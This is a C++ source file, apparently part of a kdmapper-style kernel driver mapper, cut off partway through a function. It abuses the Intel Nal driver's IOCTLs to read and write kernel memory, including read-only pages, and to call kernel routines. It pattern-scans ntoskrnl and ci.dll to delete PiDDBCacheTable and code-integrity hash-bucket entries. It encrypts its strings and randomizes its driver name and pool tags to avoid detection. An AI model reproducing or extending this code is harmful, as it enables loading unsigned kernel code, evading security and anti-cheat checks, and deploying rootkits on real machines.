#include <impl/include.hxx>

namespace intel_driver
{
	HANDLE h_device = NULL;
	ULONG64 ntoskrnl_address = 0;
	std::string cached_driver_name = "";
	static uint64_t cached_nal_driver_section_kva_for_mm = 0;

	std::wstring get_driver_name_w( )
	{
		if ( cached_driver_name.empty( ) )
		{
			char buffer[ 100 ]{};
			static const char alphanum[] =
				"abcdefghijklmnopqrstuvwxyz"
				"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
			int len = rand( ) % 20 + 10;
			for ( int i = 0; i < len; ++i )
				buffer[ i ] = alphanum[ rand( ) % ( sizeof ( alphanum ) - 1 ) ];
			cached_driver_name = buffer;
		};

		std::wstring name( cached_driver_name.begin( ), cached_driver_name.end( ) );
		return name;
	};

	std::wstring get_temp_path( )
	{
		wchar_t temp_directory[ MAX_PATH + 1 ] = { 0 };
		const DWORD get_temp_path_ret = GetTempPathW( MAX_PATH + 1, temp_directory );

		if ( !get_temp_path_ret || get_temp_path_ret > MAX_PATH + 1 )
		{
			return {};
		};

		if ( temp_directory[ wcslen( temp_directory ) - 1 ] == L'\\' )
			temp_directory[ wcslen( temp_directory ) - 1 ] = 0x0;

		return std::wstring( temp_directory );
	};

	std::wstring get_driver_path( )
	{
		std::wstring temp = get_temp_path( );
		if ( temp.empty( ) ) 
		{
			return {};
		};
		return temp + std::wstring( skCrypt( L"\\" ) ) + get_driver_name_w( );
	};

	bool is_running( )
	{
		const HANDLE file_handle = CreateFileW( skCrypt( L"\\\\.\\Nal" ), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
		if ( file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE )
		{
			CloseHandle( file_handle );
			return true;
		};
		return false;
	};

	uint64_t get_kernel_module_address( const std::string& module_name )
	{
		void* buffer = nullptr;
		DWORD buffer_size = 0;

		NTSTATUS status = NtQuerySystemInformation( static_cast< SYSTEM_INFORMATION_CLASS > ( nt::SystemModuleInformation ), buffer, buffer_size, &buffer_size );

		while ( status == STATUS_INFO_LENGTH_MISMATCH )
		{
			if ( buffer != nullptr )
				VirtualFree( buffer, 0, MEM_RELEASE );

			buffer = VirtualAlloc( nullptr, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
			status = NtQuerySystemInformation( static_cast< SYSTEM_INFORMATION_CLASS > ( nt::SystemModuleInformation ), buffer, buffer_size, &buffer_size );
		};

		if ( !NT_SUCCESS( status ) )
		{
			if ( buffer != nullptr )
				VirtualFree( buffer, 0, MEM_RELEASE );

			return 0;
		};

		const auto modules = static_cast< nt::PRTL_PROCESS_MODULES > ( buffer );
		if ( !modules )
			return 0;

		for ( auto i = 0u; i < modules->NumberOfModules; ++i ) 
		{
			const std::string current_module_name = std::string( reinterpret_cast< char* > ( modules->Modules[ i ].FullPathName ) + modules->Modules[ i ].OffsetToFileName );

			if ( !_stricmp( current_module_name.c_str( ), module_name.c_str( ) ) )
			{
				const uint64_t result = reinterpret_cast< uint64_t > ( modules->Modules[ i ].ImageBase );
				VirtualFree( buffer, 0, MEM_RELEASE );
				return result;
			};
		};

		VirtualFree( buffer, 0, MEM_RELEASE );
		return 0;
	};

	bool mem_copy( uint64_t destination, uint64_t source, uint64_t size )
	{
		if ( !destination || !source || !size )
			return 0;

		COPY_MEMORY_BUFFER_INFO copy_memory_buffer = {0};
		copy_memory_buffer.case_number = 0x33;
		copy_memory_buffer.source = source;
		copy_memory_buffer.destination = destination;
		copy_memory_buffer.length = size;
		DWORD bytes_returned = 0;

		return DeviceIoControl( h_device, ioctl_code, &copy_memory_buffer, sizeof ( copy_memory_buffer ), nullptr, 0, &bytes_returned, nullptr );
	};

	bool set_memory( uint64_t address, uint32_t value, uint64_t size )
	{
		if ( !address || !size )
			return 0;

		FILL_MEMORY_BUFFER_INFO fill_memory_buffer = {0};
		fill_memory_buffer.case_number = 0x30;
		fill_memory_buffer.destination = address;
		fill_memory_buffer.value = value;
		fill_memory_buffer.length = size;
		DWORD bytes_returned = 0;

		return DeviceIoControl( h_device, ioctl_code, &fill_memory_buffer, sizeof ( fill_memory_buffer ), nullptr, 0, &bytes_returned, nullptr );
	};

	bool get_physical_address( uint64_t address, uint64_t* out_physical_address ) 
	{
		if ( !address )
			return 0;

		GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = {0};
		get_phys_address_buffer.case_number = 0x25;
		get_phys_address_buffer.address_to_translate = address;
		DWORD bytes_returned = 0;

		if ( !DeviceIoControl( h_device, ioctl_code, &get_phys_address_buffer, sizeof ( get_phys_address_buffer ), nullptr, 0, &bytes_returned, nullptr ) )
			return false;

		*out_physical_address = get_phys_address_buffer.return_physical_address;
		return true;
	};

	uint64_t map_io_space( uint64_t physical_address, uint32_t size ) 
	{
		if ( !physical_address || !size )
			return 0;

		MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = {0};
		map_io_space_buffer.case_number = 0x19;
		map_io_space_buffer.physical_address_to_map = physical_address;
		map_io_space_buffer.size = size;
		DWORD bytes_returned = 0;

		if ( !DeviceIoControl( h_device, ioctl_code, &map_io_space_buffer, sizeof ( map_io_space_buffer ), nullptr, 0, &bytes_returned, nullptr ) )
			return 0;

		return map_io_space_buffer.return_virtual_address;
	};

	bool unmap_io_space( uint64_t address, uint32_t size ) 
	{
		if ( !address || !size )
			return false;

		UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = {0};
		unmap_io_space_buffer.case_number = 0x1A;
		unmap_io_space_buffer.virt_address = address;
		unmap_io_space_buffer.number_of_bytes = size;
		DWORD bytes_returned = 0;

		return DeviceIoControl( h_device, ioctl_code, &unmap_io_space_buffer, sizeof ( unmap_io_space_buffer ), nullptr, 0, &bytes_returned, nullptr );
	};

	bool read_memory( uint64_t address, void* buffer, uint64_t size )
	{
		return mem_copy( reinterpret_cast< uint64_t > ( buffer ), address, size );
	};

	bool write_memory( uint64_t address, void* buffer, uint64_t size )
	{
		return mem_copy( address, reinterpret_cast< uint64_t > ( buffer ), size );
	};

	bool write_to_readonly_memory( uint64_t address, void* buffer, uint32_t size )
	{
		if ( !address || !buffer || !size )
			return false;

		uint64_t physical_address = 0;
		if ( !get_physical_address( address, &physical_address ) )
		{
			return false;
		};

		const uint64_t mapped_physical_memory = map_io_space( physical_address, size );
		if ( !mapped_physical_memory )
		{
			return false;
		};

		bool result = write_memory( mapped_physical_memory, buffer, size );
		unmap_io_space( mapped_physical_memory, size );
		return result;
	};

	PVOID resolve_relative_address(_In_ PVOID instruction_pointer, _In_ ULONG offset, _In_ ULONG instruction_size )
	{
		ULONG_PTR instruction = ( ULONG_PTR )instruction_pointer;
		LONG rip_offset = 0;
		if ( !read_memory( instruction + offset, &rip_offset, sizeof ( LONG )) )
		{
			return nullptr;
		};

		PVOID resolved_address = ( PVOID )( instruction + instruction_size + rip_offset );
		return resolved_address;
	};

	static PVOID resolve_relative_address_uintptr_t( uintptr_t instruction_pointer, ULONG offset, ULONG instruction_size )
	{
		return resolve_relative_address( reinterpret_cast< PVOID > ( instruction_pointer ), offset, instruction_size );
	};

	uint64_t get_kernel_module_export( uint64_t kernel_module_base, const std::string& function_name )
	{
		if ( !kernel_module_base )
			return 0;

		IMAGE_DOS_HEADER dos_header = {0};
		IMAGE_NT_HEADERS64 nt_headers = {0};

		if ( !read_memory( kernel_module_base, &dos_header, sizeof ( dos_header )) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
			!read_memory( kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof ( nt_headers )) || nt_headers.Signature != IMAGE_NT_SIGNATURE )
			return 0;

		const auto export_base = nt_headers.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
		const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
		if ( !export_base || !export_base_size )
			return 0;

		const auto export_data = reinterpret_cast< PIMAGE_EXPORT_DIRECTORY > ( VirtualAlloc( nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );

		if ( !read_memory( kernel_module_base + export_base, export_data, export_base_size ) )
		{
			VirtualFree( export_data, 0, MEM_RELEASE );
			return 0;
		};

		const auto delta = reinterpret_cast< uint64_t > ( export_data) - export_base;
		const auto name_table = reinterpret_cast< uint32_t* > ( export_data->AddressOfNames + delta );
		const auto ordinal_table = reinterpret_cast< uint16_t* > ( export_data->AddressOfNameOrdinals + delta );
		const auto function_table = reinterpret_cast< uint32_t* > ( export_data->AddressOfFunctions + delta );

		for ( auto i = 0u; i < export_data->NumberOfNames; ++i )
		{
			const std::string current_function_name = std::string( reinterpret_cast< char* > ( name_table[ i ] + delta ) );
			if ( !_stricmp( current_function_name.c_str( ), function_name.c_str( ) ))
			{
				const auto function_ordinal = ordinal_table[ i ];
				if ( function_table[ function_ordinal ] <= 0x1000 )
				{
					return 0;
				};

				const auto function_address = kernel_module_base + function_table[ function_ordinal ];
				if ( function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size )
				{
					VirtualFree( export_data, 0, MEM_RELEASE );
					return 0;
				};

				VirtualFree( export_data, 0, MEM_RELEASE );
				return function_address;
			};
		};

		VirtualFree( export_data, 0, MEM_RELEASE );
		return 0;
	};

	bool ex_release_resource_lite( PVOID resource ) 
	{
		if ( !resource )
			return false;
		static uint64_t kernel_ex_release_resource_lite = get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "ExReleaseResourceLite" ) ) );
		if ( !kernel_ex_release_resource_lite )
		{
			return false;
		};
		return call_kfc< void > ( nullptr, kernel_ex_release_resource_lite, resource );
	};

	bool ex_acquire_resource_exclusive_lite( PVOID resource, BOOLEAN wait )
	{
		if ( !resource )
			return 0;
		static uint64_t kfc = get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "ExAcquireResourceExclusiveLite" ) ) );
		if ( !kfc )
		{
			return 0;
		};
		BOOLEAN out;
		return (call_kfc(&out, kfc, resource, wait) && out );
	};

	BOOLEAN rtl_delete_element_generic_table_avl( PVOID table, PVOID buffer )
	{
		if ( !table )
			return false;
		static uint64_t kernel_rtl_delete_element_generic_table_avl = get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "RtlDeleteElementGenericTableAvl" ) ) );
		if ( !kernel_rtl_delete_element_generic_table_avl )
		{
			return false;
		};
		bool out;
		return (call_kfc(&out, kernel_rtl_delete_element_generic_table_avl, table, buffer) && out );
	};


	PVOID rtl_lookup_element_generic_table_avl( nt::PRTL_AVL_TABLE table, PVOID buffer )
	{
		if ( !table )
			return nullptr;
		static uint64_t kernel_rtl_lookup_element_generic_table_avl = get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "RtlLookupElementGenericTableAvl" ) ) );
		if ( !kernel_rtl_lookup_element_generic_table_avl )
		{
			return nullptr;
		};
		PVOID out;
		if ( !call_kfc(&out, kernel_rtl_lookup_element_generic_table_avl, table, buffer ) )
			return 0;
		return out;
	};

	PVOID rtl_enumerate_generic_table_without_splaying_avl( nt::PRTL_AVL_TABLE table, PVOID* restart_key )
	{
		if ( !table || !restart_key )
			return nullptr;
		static uint64_t kernel_rtl_enumerate_generic_table_without_splaying_avl =
			get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "RtlEnumerateGenericTableWithoutSplayingAvl" ) ) );
		if ( !kernel_rtl_enumerate_generic_table_without_splaying_avl )
			return nullptr;
		PVOID out{};
		if ( !call_kfc(&out, kernel_rtl_enumerate_generic_table_without_splaying_avl, table, restart_key ) )
			return nullptr;
		return out;
	};

	BOOLEAN data_compare( const BYTE* data, const BYTE* mask, const char* mask_size )
	{
		for ( ; *mask_size; ++mask_size, ++data, ++mask )
			if ( *mask_size == 'x' && *data != *mask )
				return 0;

		return (*mask_size) == 0;
	};

	uintptr_t find_pattern( uintptr_t address, uintptr_t length, BYTE* mask, const char* mask_size )
	{
		size_t max_len = length - strlen( mask_size );

		for ( uintptr_t i = 0; i < max_len; i++ )
			if ( data_compare( ( BYTE* )( address + i ), mask, mask_size ) )
				return ( uintptr_t )( address + i );

		return 0;
	};

	PVOID find_section( const char* section_name, uintptr_t module_pointer, PULONG size )
	{
		size_t name_length = strlen( section_name );
		PIMAGE_NT_HEADERS headers = ( PIMAGE_NT_HEADERS )( module_pointer + ( ( PIMAGE_DOS_HEADER ) module_pointer )->e_lfanew );
		PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION( headers );

		for ( DWORD i = 0; i < headers->FileHeader.NumberOfSections; ++i )
		{
			PIMAGE_SECTION_HEADER section = &sections[ i ];
			if ( memcmp( section->Name, section_name, name_length ) == 0 &&
				name_length == strlen( ( char* ) section->Name ) )
			{
				if ( !section->VirtualAddress )
				{
					return 0;
				};

				if ( size )
				{
					*size = section->Misc.VirtualSize;
				};

				return ( PVOID )( module_pointer + section->VirtualAddress );
			};
		};

		return 0;
	};

	uintptr_t find_pattern_kernel( uintptr_t address, uintptr_t length, BYTE* mask, const char* mask_size )
	{
		if ( !address )
		{
			return 0;
		};

		if ( length > 1024 * 1024 * 1024 )
		{
			return 0;
		};

		auto section_data = std::make_unique< BYTE[] >(length );
		if ( !read_memory( address, section_data.get( ), length ) )
		{
			return 0;
		};

		auto result = find_pattern((uintptr_t)section_data.get( ), length, mask, mask_size );
		if ( result <= 0 )
		{
			return 0;
		};

		result = address - (uintptr_t)section_data.get( ) + result;
		return result;
	};

	uintptr_t find_section_kernel( const char* section_name, uintptr_t module_pointer, PULONG size )
	{
		if ( !module_pointer )
			return 0;

		BYTE headers[0x1000];
		if ( !read_memory( module_pointer, headers, 0x1000 ) )
		{
			return 0;
		};

		ULONG section_size = 0;
		uintptr_t section = (uintptr_t)find_section( section_name, (uintptr_t)headers, &section_size );
		if ( !section || !section_size )
		{
			return 0;
		};

		if ( size )
			*size = section_size;
		return section - (uintptr_t)headers + module_pointer;
	};

	uintptr_t find_pattern_in_section_kernel( const char* section_name, uintptr_t module_pointer, BYTE* mask, const char* mask_size )
	{
		ULONG section_size = 0;
		uintptr_t section = find_section_kernel( section_name, module_pointer, &section_size );
		return find_pattern_kernel( section, section_size, mask, mask_size );
	};

	uint64_t mm_allocate_independent_pages_ex( uint32_t size )
	{
		uint64_t allocated_pages{};

		static uint64_t kernel_mm_allocate_independent_pages_ex = 0;
		if ( !kernel_mm_allocate_independent_pages_ex )
		{
			kernel_mm_allocate_independent_pages_ex = find_pattern_in_section_kernel( skCrypt( ".text" ), ntoskrnl_address,
				(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
				skCrypt( "xxxxxxxxx????xxx" ) );
			if ( !kernel_mm_allocate_independent_pages_ex )
			{
				return 0;
			};

			kernel_mm_allocate_independent_pages_ex += 8;

			kernel_mm_allocate_independent_pages_ex = (uint64_t)resolve_relative_address((PVOID)kernel_mm_allocate_independent_pages_ex, 1, 5 );
			if ( !kernel_mm_allocate_independent_pages_ex )
			{
				return 0;
			};
		};

		if ( !call_kfc(&allocated_pages, kernel_mm_allocate_independent_pages_ex, size, -1, 0, 0 ) )
			return 0;

		return allocated_pages;
	};

	bool mm_free_independent_pages( uint64_t address, uint32_t size )
	{
		static uint64_t kernel_mm_free_independent_pages = 0;

		if ( !kernel_mm_free_independent_pages )
		{
			kernel_mm_free_independent_pages = find_pattern_in_section_kernel( skCrypt( "PAGE" ), ntoskrnl_address,
				(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
				skCrypt( "xxxxxxxxx????xxxxxxx" ) );
			if ( !kernel_mm_free_independent_pages )
			{
				kernel_mm_free_independent_pages = find_pattern_in_section_kernel( skCrypt( "PAGE" ), ntoskrnl_address,
					(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
					skCrypt( "xx????xxxx????xxx" ) );

				if ( !kernel_mm_free_independent_pages )
				{
					return false;
				};

				kernel_mm_free_independent_pages += 9;
			}
			else
			{
				kernel_mm_free_independent_pages += 8;
			};

			kernel_mm_free_independent_pages = (uint64_t)resolve_relative_address((PVOID)kernel_mm_free_independent_pages, 1, 5 );
			if ( !kernel_mm_free_independent_pages )
			{
				return false;
			};
		};

		uint64_t result{};
		return call_kfc(&result, kernel_mm_free_independent_pages, address, size );
	};

	BOOLEAN mm_set_page_protection( uint64_t address, uint32_t size, ULONG new_protect )
	{
		if ( !address )
		{
			return FALSE;
		};

		static uint64_t kernel_mm_set_page_protection = 0;

		if ( !kernel_mm_set_page_protection )
		{
			kernel_mm_set_page_protection = find_pattern_in_section_kernel( skCrypt( "PAGELK" ), ntoskrnl_address,
				(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
				skCrypt( "xx??x???xxx" ) );
			if ( !kernel_mm_set_page_protection )
			{
				kernel_mm_set_page_protection = find_pattern_in_section_kernel( skCrypt( "PAGELK" ), ntoskrnl_address,
					(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
					skCrypt( "xx??xx????x???xxx" ) );

				if ( !kernel_mm_set_page_protection )
				{
					return FALSE;
				};

				kernel_mm_set_page_protection += 13;
			}
			else
			{
				kernel_mm_set_page_protection += 10;
			};

			kernel_mm_set_page_protection = (uint64_t)resolve_relative_address((PVOID)kernel_mm_set_page_protection, 1, 5 );
			if ( !kernel_mm_set_page_protection )
			{
				return FALSE;
			};
	    };

		BOOLEAN set_prot_status{};
		if ( !call_kfc(&set_prot_status, kernel_mm_set_page_protection, address, size, new_protect ) )
			return FALSE;

		return set_prot_status;
	};

	inline ULONG mapper_pool_tag( )
	{
		static ULONG tag = 0;
		if ( tag != 0 )
			return tag;

		LARGE_INTEGER qpc{ };
		QueryPerformanceCounter( &qpc );
		const ULONG mix = static_cast< ULONG >(
			( static_cast< ULONG_PTR >( GetTickCount64( ) ) ^
				( static_cast< ULONG_PTR >( GetCurrentProcessId( ) ) << 13 ) ^
				( static_cast< ULONG_PTR >( GetCurrentThreadId( ) ) << 7 ) ^
				static_cast< ULONG_PTR >( qpc.QuadPart ) ) );

		tag = mix ? mix : 0x3F4D4D50u;
		return tag;
	};

	uint64_t allocate_pool( nt::POOL_TYPE pool_type, uint64_t size )
	{
		if ( !size )
			return 0;

		static uint64_t kernel_ex_allocate_pool_with_quota = get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "ExAllocatePoolWithQuotaTag" ) ) );
		static uint64_t kernel_ex_allocate_pool_priority = get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "ExAllocatePoolPriorityUninitialized" ) ) );
		static uint64_t kernel_ex_allocate_pool = get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "ExAllocatePoolWithTag" ) ) );

		uint64_t kernel_alloc_func = 0;
		if ( kernel_ex_allocate_pool_with_quota )
			kernel_alloc_func = kernel_ex_allocate_pool_with_quota;
		else if ( kernel_ex_allocate_pool_priority )
			kernel_alloc_func = kernel_ex_allocate_pool_priority;
		else if ( kernel_ex_allocate_pool )
			kernel_alloc_func = kernel_ex_allocate_pool;
		else
			return 0;

		uint64_t allocated_pool = 0;
		const ULONG tag = mapper_pool_tag( );
		if ( !call_kfc( &allocated_pool, kernel_alloc_func, pool_type, size, tag ) )
			return 0;
		return allocated_pool;
	};

	uint64_t allocate_pool_ex2( nt::POOL_TYPE pool_type, uint64_t size )
	{
		if ( !size )
			return 0;

		static uint64_t kernel_ex_allocate_pool2 = get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "ExAllocatePool2" ) ) );
		if ( !kernel_ex_allocate_pool2 )
			return allocate_pool( pool_type, size );

		uint64_t allocated_pool = 0;
		ULONG flags = 0x100;
		if ( pool_type == nt::POOL_TYPE::PagedPool )
			flags = 0x200;
		if ( !call_kfc( &allocated_pool, kernel_ex_allocate_pool2, flags, size, mapper_pool_tag( ) ) )
			return 0;

		return allocated_pool;
	};

	bool free_pool( uint64_t address )
	{
		if ( !address )
			return 0;

		static uint64_t kernel_ex_free_pool_with_tag = get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "ExFreePoolWithTag" ) ) );
		static uint64_t kernel_ex_free_pool = get_kernel_module_export( ntoskrnl_address, std::string( skCrypt( "ExFreePool" ) ) );

		if ( kernel_ex_free_pool_with_tag )
		{
			return call_kfc< void >( nullptr, kernel_ex_free_pool_with_tag, address, mapper_pool_tag( ) );
		};
		if ( kernel_ex_free_pool )
		{
			return call_kfc< void >( nullptr, kernel_ex_free_pool, address );
		};

		return 0;
	};

	static bool piddb_kernel_entry_name_matches_needle( uintptr_t entry_kern, const std::wstring& needle )
	{
		if ( !entry_kern || needle.empty( ) )
			return false;
		USHORT name_len = 0;
		if ( !read_memory( entry_kern + offsetof( nt::PiDDBCacheEntry, DriverName.Length ), &name_len, sizeof ( name_len ))
			|| !name_len || name_len > 32767 )
			return false;
		PWCH name_buf = nullptr;
		if ( !read_memory( entry_kern + offsetof( nt::PiDDBCacheEntry, DriverName.Buffer ), &name_buf, sizeof ( name_buf ))
			|| !name_buf )
			return false;
		std::vector<wchar_t> wide( static_cast< size_t > ( name_len) / sizeof ( wchar_t ) + 1u, 0 );
		if ( !read_memory( reinterpret_cast< uintptr_t > ( name_buf ), wide.data( ), name_len ) )
			return false;
		std::wstring haystack( wide.data( ) );
		std::wstring ndl = needle;
		for ( wchar_t& c : haystack )
			c = static_cast< wchar_t > ( std::towlower( static_cast< wint_t > ( static_cast< unsigned short > ( c ) )) );
		for ( wchar_t& c : ndl )
			c = static_cast< wchar_t > ( std::towlower( static_cast< wint_t > ( static_cast< unsigned short > ( c ) )) );
		return haystack.find( ndl) != std::wstring::npos;
	};

	static bool unlink_and_delete_piddb_entry( nt::PRTL_AVL_TABLE piddb_cache_table, nt::PiDDBCacheEntry* found_entry )
	{
		PLIST_ENTRY prev = nullptr;
		if ( !read_memory( reinterpret_cast< uintptr_t > ( found_entry) + offsetof( nt::PiDDBCacheEntry, List.Blink ), &prev, sizeof ( prev )) )
			return false;
		PLIST_ENTRY next = nullptr;
		if ( !read_memory( reinterpret_cast< uintptr_t > ( found_entry) + offsetof( nt::PiDDBCacheEntry, List.Flink ), &next, sizeof ( next )) )
			return false;
		if ( !write_memory( reinterpret_cast< uintptr_t > ( prev) + offsetof(_LIST_ENTRY, Flink ), &next, sizeof ( next )) )
			return false;
		if ( !write_memory( reinterpret_cast< uintptr_t > ( next) + offsetof(_LIST_ENTRY, Blink ), &prev, sizeof ( prev )) )
			return false;
		if ( !rtl_delete_element_generic_table_avl( piddb_cache_table, found_entry ) )
			return false;
		ULONG delete_count = 0;
		read_memory( reinterpret_cast< uintptr_t > ( piddb_cache_table) + offsetof( nt::RTL_AVL_TABLE, DeleteCount ),
			&delete_count, sizeof ( delete_count ));
		if ( delete_count > 0 )
		{
			delete_count--;
			write_memory( reinterpret_cast< uintptr_t > ( piddb_cache_table) + offsetof( nt::RTL_AVL_TABLE, DeleteCount ),
				&delete_count, sizeof ( delete_count ));
		};
		return true;
	};

	static bool remove_first_piddb_entry_matching_needle( nt::PRTL_AVL_TABLE piddb_cache_table, const std::wstring& needle )
	{
		PVOID restart_key = nullptr;
		for ( ;;)
		{
			PVOID element = rtl_enumerate_generic_table_without_splaying_avl( piddb_cache_table, &restart_key );
			if ( !element )
				return false;
			if ( piddb_kernel_entry_name_matches_needle( reinterpret_cast< uintptr_t > ( element ), needle ) )
				return unlink_and_delete_piddb_entry( piddb_cache_table, reinterpret_cast< nt::PiDDBCacheEntry* > ( element ) );
		};
	};

	static bool resolve_piddb_table( PVOID* piddb_lock_out, nt::PRTL_AVL_TABLE* piddb_cache_table_out )
	{
		if ( !piddb_lock_out || !piddb_cache_table_out )
			return false;

		auto piddb_lock_pointer = find_pattern_in_section_kernel( skCrypt( "PAGE" ), ntoskrnl_address,
			(PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24",
			skCrypt( "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x" ) );
		auto piddb_cache_table_pointer = find_pattern_in_section_kernel( skCrypt( "PAGE" ), ntoskrnl_address,
			(PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", skCrypt( "xxxxxx" ) );

		if ( piddb_lock_pointer == NULL )
		{
			piddb_lock_pointer = find_pattern_in_section_kernel( skCrypt( "PAGE" ), ntoskrnl_address,
				(PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", skCrypt( "xxx????xxxxx????xxx????x????x" ) );
			if ( piddb_lock_pointer == NULL )
			{
				piddb_lock_pointer = find_pattern_in_section_kernel( skCrypt( "PAGE" ), ntoskrnl_address,
					(PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24",
					skCrypt( "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x" ) );
				if ( piddb_lock_pointer == NULL )
					return false;
				piddb_lock_pointer += 19;
			}
			else
				piddb_lock_pointer += 16;
		}
		else
			piddb_lock_pointer += 28;

		if ( piddb_cache_table_pointer == NULL )
		{
			piddb_cache_table_pointer = find_pattern_in_section_kernel( skCrypt( "PAGE" ), ntoskrnl_address,
				(PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", skCrypt( "xxxxxxxx" ) );
			if ( piddb_cache_table_pointer == NULL )
				return false;
			piddb_cache_table_pointer += 2;
		};

		*piddb_lock_out = resolve_relative_address( ( PVOID )piddb_lock_pointer, 3, 7 );
		*piddb_cache_table_out = ( nt::PRTL_AVL_TABLE )resolve_relative_address( ( PVOID )piddb_cache_table_pointer, 6, 10 );
		return *piddb_lock_out && *piddb_cache_table_out;
	};

	nt::PiDDBCacheEntry* piddb_lookup_entry( nt::PRTL_AVL_TABLE piddb_cache_table, ULONG timestamp, const wchar_t* name )
	{
		if ( !piddb_cache_table || !name )
			return nullptr;

		nt::PiDDBCacheEntry localentry{};
		localentry.TimeDateStamp = timestamp;
		localentry.DriverName.Buffer = ( PWCH )name;
		localentry.DriverName.Length = ( USHORT )( wcslen( name ) * 2 );
		localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

		return reinterpret_cast< nt::PiDDBCacheEntry* >(
			rtl_lookup_element_generic_table_avl( piddb_cache_table, &localentry ) );
	};

	bool clear_piddb_cache_table_lookup( )
	{
		PVOID piddb_lock = nullptr;
		nt::PRTL_AVL_TABLE piddb_cache_table = nullptr;
		if ( !resolve_piddb_table( &piddb_lock, &piddb_cache_table ) )
			return false;

		if ( !ex_acquire_resource_exclusive_lite( piddb_lock, true ) )
			return false;

		const PIMAGE_NT_HEADERS64 nt_headers =
			portable_executable::get_nt_headers( reinterpret_cast< void* >( const_cast< uint8_t* >( resource::driver ) ) );
		if ( !nt_headers )
		{
			ex_release_resource_lite( piddb_lock );
			return false;
		};

		const ULONG timestamp = nt_headers->FileHeader.TimeDateStamp;
		const std::wstring driver_name = get_driver_name_w( );
		nt::PiDDBCacheEntry* found_entry = piddb_lookup_entry( piddb_cache_table, timestamp, driver_name.c_str( ) );
		if ( !found_entry )
		{
			ex_release_resource_lite( piddb_lock );
			return true;
		};

		const bool cleaned = unlink_and_delete_piddb_entry( piddb_cache_table, found_entry );
		ex_release_resource_lite( piddb_lock );
		return cleaned;
	};

	bool clear_piddb_cache_table( )
	{
		PVOID piddb_lock = nullptr;
		nt::PRTL_AVL_TABLE piddb_cache_table = nullptr;
		if ( !resolve_piddb_table( &piddb_lock, &piddb_cache_table ) )
			return false;

		if ( !ex_acquire_resource_exclusive_lite( piddb_lock, true ) )
			return false;

		const std::wstring needle = get_driver_name_w( );
		while ( remove_first_piddb_entry_matching_needle( piddb_cache_table, needle ) )
		{
		};

		ex_release_resource_lite( piddb_lock );
		return true;
	};

	NTSTATUS accquire_debug_privilege( )
	{
		HMODULE ntdll = GetModuleHandleA( skCrypt( "ntdll.dll" ) );
		if ( ntdll == NULL )
		{
			return STATUS_UNSUCCESSFUL;
		};

		BOOLEAN se_debug_was_enabled;
		return nt::RtlAdjustPrivilege( 20UL, TRUE, FALSE, &se_debug_was_enabled );
	};

	bool clear_hash_bucket_list( ) 
	{
		uint64_t ci = get_kernel_module_address( std::string( skCrypt( "ci.dll" ) ) );
		if ( !ci )
		{
			return false;
		};
		auto sig = find_pattern_in_section_kernel( skCrypt( "PAGE" ), ci, PUCHAR( "\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"), skCrypt( "xxx????x?xxxxxxx" ) );
		if ( !sig )
		{
			sig = find_pattern_in_section_kernel( skCrypt( "PAGE" ), ci, PUCHAR( "\x48\x8B\x1D\x00\x00\x00\x00\x48\x8B\xD0\x48\x85\xDB\x74"), skCrypt( "xxx????xxxxxxx" ) );
		};
		if ( !sig )
		{
			return false;
		};
		auto sig2 = find_pattern_kernel((uintptr_t)sig - 50, 50, PUCHAR( "\x48\x8D\x0D"), skCrypt( "xxx" ) );
		if ( !sig2 )
		{
			return false;
		};
